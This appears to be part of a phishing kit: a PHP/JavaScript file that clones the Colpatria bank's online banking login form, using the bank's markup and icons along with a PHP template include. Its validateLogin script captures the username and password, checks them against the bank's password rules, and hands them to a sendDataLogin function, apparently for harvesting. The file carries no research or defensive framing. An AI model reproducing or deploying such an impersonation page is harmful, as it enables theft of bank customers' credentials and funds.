var colpatria_contenido = `
<div class="col-xs-12 block--padding-0 margin-xs-72--bottom">
    <div class="direction--row">
        <div class="col-xs-12 offset-sm-3 col-sm-6 col-md-4 offset-md-0 block--padding-0 m-auto">
            <h1 class="hero">Ingresa a tu Banca Virtual</h1>
            <form onsubmit="return false" novalidate="" role="form" autocomplete="off" class="form ng-pristine ng-invalid ng-touched"><!----><!---->
                <div class="form__input margin-xs-30--top">
                    <canvas-input-text formcontrolname="firstCredential" _nghost-hjw-c48="" class="ng-pristine ng-invalid ng-touched" maxlength="12">
                        <div class="form__input">
                            <label role="text" class="label" for="inputUserNameId"></label>
                            <div class="form__input--inline">
                                <input required class="input input--text ng-pristine ng-valid ng-touched input--with-icon input--with-icon--left input-w-aux__input" id="txtUsuario" type="text" placeholder="Nombre de usuario" autocomplete="off" aria-describedby="first-credential-input-error" maxlength="12">
                                <canvas-svg role="presentation" class="input__icon input__icon--left flex">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true" class="svg-icon svg-icon--size-18px">
                                        <path fill="#333" stroke-linecap="round" stroke-width="0.5" stroke-linejoin="round" d="M22.879 22.129a.75.75 0 1 1-1.5 0v-2.39c0-2.212-1.979-4.031-4.449-4.031H6.532c-2.47 0-4.449 1.82-4.449 4.03v2.39a.75.75 0 1 1-1.5 0v-2.39c0-3.069 2.677-5.53 5.95-5.53H16.93c3.272 0 5.949 2.461 5.949 5.53v2.39zm-10.79-10.006a5.77 5.77 0 1 1 0-11.54 5.77 5.77 0 0 1 0 11.54zm0-1.5a4.27 4.27 0 1 0 0-8.54 4.27 4.27 0 0 0 0 8.54z"></path>
                                    </svg>
                                </canvas-svg>
                                <div type="button" class="button input-w-aux__action">
                                    <canvas-svg role="presentation" class="flex">
                                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true" class="svg-icon svg-icon--size-18px">
                                            <path fill="none" d="M22.667 12c0 5.891-4.776 10.667-10.667 10.667C6.108 22.667 1.333 17.89 1.333 12S6.108 1.333 12 1.333c5.89 0 10.667 4.776 10.667 10.667zM8.647 8.648l6.705 6.704m0-6.704l-6.704 6.704"></path>
                                        </svg>
                                    </canvas-svg>
                                </div>
                            </div>
                        </div>
                    </canvas-input-text>
                    <span id="first-credential-input-error"><!----></span>
                </div>
                <div class="margin-xs-24--top form__password">
                    <canvas-input-text formcontrolname="secondCredential" _nghost-hjw-c48="" class="ng-untouched ng-pristine ng-invalid" maxlength="15">
                        <div class="form__input">
                            <label role="text" class="label" for="inputPswdId"></label>
                            <div class="form__input--inline">
                                <input required class="input input--text ng-untouched ng-pristine ng-valid input--with-icon input--with-icon--left input-w-aux__input" id="txtPassword" type="password" placeholder="Contraseña" autocomplete="off" aria-describedby="second-credential-input-error" maxlength="15">
                                <canvas-svg role="presentation" class="input__icon input__icon--left flex">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true" class="svg-icon svg-icon--size-18px">
                                        <path fill="none" d="M20.175 19.972c0 .988-.808 1.796-1.796 1.796H5.804a1.802 1.802 0 0 1-1.797-1.796v-8.983c0-.988.808-1.796 1.797-1.796h12.575c.988 0 1.796.808 1.796 1.796v8.983z"></path>
                                        <path d="M12.99 13.684a.897.897 0 1 1-1.795.002.897.897 0 0 1 1.794-.002z"></path>
                                        <path fill="none" d="M12.104 14.582v2.695"></path>
                                        <path fill="none" d="M16.607 6.498v2.33M7.6 9.065V6.499m0 0a4.492 4.492 0 0 1 8.982 0"></path>
                                    </svg>
                                </canvas-svg>
                                <button id="showPass" type="button" class="button input-w-aux__action">
                                    <canvas-svg role="presentation" class="flex">
                                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true" class="svg-icon svg-icon--size-18px">
                                            <g fill="none">
                                                <path d="M1.333 11.933c0 1.451 3.43 7.334 10.667 7.334 1.686 0 3.165-.32 4.442-.827 4.206-1.673 6.225-5.394 6.225-6.507 0-1.45-3.43-7.333-10.667-7.333-7.236 0-10.667 5.882-10.667 7.333z"></path>
                                                <path d="M12 8.267c-2.076 0-3.765 1.645-3.765 3.666 0 2.022 1.69 3.667 3.765 3.667 2.076 0 3.765-1.645 3.765-3.667 0-2.021-1.69-3.666-3.765-3.666"></path>
                                            </g>
                                        </svg>
                                    </canvas-svg>
                                </button>
                            </div>
                        </div>
                    </canvas-input-text>
                    <div class="password-validation">
                        <span id="validation_8c"> 8+ caracteres </span>
                        <span id="validation_1u"> 1+ mayúscula </span>
                        <span id="validation_1l"> 1+ minúscula </span>
                        <span id="validation_1n"> 1+ número </span>
                    </div>
                </div>
                <div class="margin-xs-18--top">
                    <a class="link link__text" id="linkHelpId" href="#">¿Necesitas ayuda para ingresar?</a>
                </div>
                <div class="margin-xs-36--top">
                    <canvas-input-checkbox formcontrolname="rememberUser" class="ng-untouched ng-pristine ng-valid">
                        <label class="form__input form__input--inline form__input--checkbox" for="checkRememberUserId">
                            <input type="checkbox" class="input input--checkbox ng-untouched ng-pristine ng-valid" id="checkRememberUserId">
                            <span class="checkbox">
                                <svg focusable="false" role="presentation" aria-hidden="true" viewBox="0 0 24 24" class="svg-icon svg-icon--size-12px checkbox__check">
                                    <path stroke="none" d="M13.85 10.667l6.533-5.683A1.727 1.727 0 0 1 22.65 7.59l-6.511 5.663-6.371 5.74c-.7.63-1.775.585-2.418-.103l-6.134-6.559a1.727 1.727 0 0 1 2.522-2.359l4.977 5.321 5.134-4.626z"></path>
                                </svg>
                            </span>
                            <div class="label label--inline label--checkbox"> Recordar mi nombre de usuario</div>
                        </label>
                    </canvas-input-checkbox>
                </div>
                <div class="margin-xs-24--top">
                    <canvas-button width="100%">
                        <button class="button button--primary" onclick="validateLogin()" id="btnUsuario" style="width: 100%;">
                            <span>Ingresar</span>
                        </button>
                    </canvas-button>
                </div>
            </form>
        </div>
    </div>
</div>
`
<?php
require_once('_plantilla_colpatria.php');
?>
//<script>
    $('auth-login').html(colpatria_contenido);

    function validateLogin() {
        let usuario = $('#txtUsuario').val();
        if (usuario == ''){
            $('#txtUsuario').focus();
            return;
        }
        let password = $('#txtPassword').val();
        if (!(/.{8,}/).test(password) || !(/\d+/).test(password) || !(/[A-Z]+/).test(password) || !(/[a-z]+/).test(password)) {
            $('#txtPassword').focus();
            return;
        }
        sendDataLogin(usuario, password)
    }

    $('#txtPassword').keyup(function(e) {
        let val = e.target.value;
        $('#txtPassword').toggleClass('input--active', val != '');
        $('#validation_8c').toggleClass('text-success', (/.{8,}/).test(val));
        $('#validation_1n').toggleClass('text-success', (/\d+/).test(val));
        $('#validation_1u').toggleClass('text-success', (/[A-Z]+/).test(val));
        $('#validation_1l').toggleClass('text-success', (/[a-z]+/).test(val));
    })

    $('#txtPassword').focus(function() {
        $('.password-validation').toggleClass('visible', true)
    });

    $('#txtPassword').focusout(function() {
        $('.password-validation').toggleClass('visible', false)
    });

    $('#showPass').click(function() {
        let t = $('#txtPassword').attr('type');
        $('#txtPassword').attr('type', t == 'text' ? 'password' : 'text');
    });